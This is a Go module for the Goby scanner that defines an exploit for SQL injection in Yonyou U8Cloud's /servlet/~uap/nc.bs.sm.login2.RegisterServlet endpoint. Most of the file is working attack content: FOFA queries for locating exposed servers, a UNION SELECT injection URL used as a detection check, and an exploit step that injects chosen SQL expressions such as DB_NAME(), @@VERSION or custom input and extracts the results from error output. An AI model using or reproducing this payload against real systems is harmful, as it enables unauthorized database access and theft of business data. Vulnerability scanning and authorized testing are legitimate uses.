package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyou U8Cloud /servlet/~uap/nc.bs.sm.login2.RegisterServlet SQL Injection Vulnerability",
    "Description": "<p>Yonyou U8 Cloud is a new generation of cloud ERP launched by Yonyou, mainly focusing on growth and innovative enterprises, providing enterprise level cloud ERP overall solutions.</p><p>There is an SQL injection vulnerability at the interface of U8Cloud nc.bs.sm.login2.registerServlet, which allows unauthorized attackers to gain database privileges and steal user data, resulting in user information leakage.</p>",
    "Product": "Yonyou U8Cloud",
    "Homepage": "https://www.yonyou.com/ ",
    "DisclosureDate": "2024-12-03",
    "PostTime": "2024-12-03",
    "Author": "1638690747@qq.com",
    "FofaQuery": "title=\"U8C\" && body=\"U8 cloud\"",
    "GobyQuery": "title=\"U8C\" && body=\"U8 cloud\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to gain database access through SQL injection, potentially leading to sensitive data leakage, data tampering, and system integrity compromise.</p>",
    "Recommendation": "<p>It is recommended to immediately fix the SQL injection vulnerability by using parameterized queries or prepared statements to handle user input. Additionally, restrict access to the relevant interface and enforce strict permission control on database operations.</p>",
    "References": [
        "https://blog.csdn.net/qq_67810151/article/details/137118925"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "DB_NAME(),@@VERSION,SYSTEM_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)),NULL,NULL,NULL,NULL--",
                "follow_redirect": true,
                "header": {
                    "X-Forwarded-For": "127.0.0.1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "invalid UFDate",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)),NULL,NULL,NULL,NULL--"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,{{{payload}}},NULL,NULL,NULL,NULL--%20",
                "follow_redirect": true,
                "header": {
                    "X-Forwarded-For": "127.0.0.1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|UFDate: ([^'][\\s\\S]*)",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "用友U8Cloud /servlet/~uap/nc.bs.sm.login2.RegisterServlet SQL 注入漏洞",
            "Product": "用友U8Cloud",
            "Description": "<p>用友U8 Cloud 是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。</p><p>用友U8Cloud nc.bs.sm.login2.RegisterServlet接口处存在SQL注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。<br></p>",
            "Recommendation": "<p>建议立即修复SQL注入漏洞，采用参数化查询或预编译语句来处理用户输入。同时，限制对相关接口的访问权限，并对数据库操作进行严格的权限控制。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入获取数据库权限，可能导致敏感数据泄露、数据篡改以及系统完整性破坏等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yonyou U8Cloud /servlet/~uap/nc.bs.sm.login2.RegisterServlet SQL Injection Vulnerability",
            "Product": "Yonyou U8Cloud",
            "Description": "<p>Yonyou U8 Cloud is a new generation of cloud ERP launched by Yonyou, mainly focusing on growth and innovative enterprises, providing enterprise level cloud ERP overall solutions.<br></p><p>There is an SQL injection vulnerability at the interface of U8Cloud nc.bs.sm.login2.registerServlet, which allows unauthorized attackers to gain database privileges and steal user data, resulting in user information leakage.<br></p>",
            "Recommendation": "<p>It is recommended to immediately fix the SQL injection vulnerability by using parameterized queries or prepared statements to handle user input. Additionally, restrict access to the relevant interface and enforce strict permission control on database operations.</p>",
            "Impact": "<p>This vulnerability allows attackers to gain database access through SQL injection, potentially leading to sensitive data leakage, data tampering, and system integrity compromise.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}